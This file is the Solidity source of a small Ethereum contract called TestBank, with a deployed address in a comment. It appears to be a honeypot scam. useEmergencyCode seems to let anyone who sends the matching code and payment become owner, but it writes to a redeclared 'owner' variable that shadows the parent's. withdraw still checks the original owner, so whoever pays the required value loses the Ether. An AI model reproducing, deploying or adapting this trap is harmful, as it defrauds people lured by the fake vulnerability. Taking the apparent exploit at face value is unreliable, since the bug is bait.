
// contract address: 0x70C01853e4430cae353c9a7AE232a6a95f6CaFd9

pragma solidity ^0.4.18;

contract Owned {
    address public owner;
    function Owned() { owner = msg.sender; }
    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
}

contract TestBank is Owned {
    event BankDeposit(address from, uint amount);
    event BankWithdrawal(address from, uint amount);
    address public owner = msg.sender;
    uint256 ecode;
    uint256 evalue;

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        BankDeposit(msg.sender, msg.value);
    }

    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
        ecode = code;
        evalue = value;
    }

    function useEmergencyCode(uint256 code) public payable {
        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}
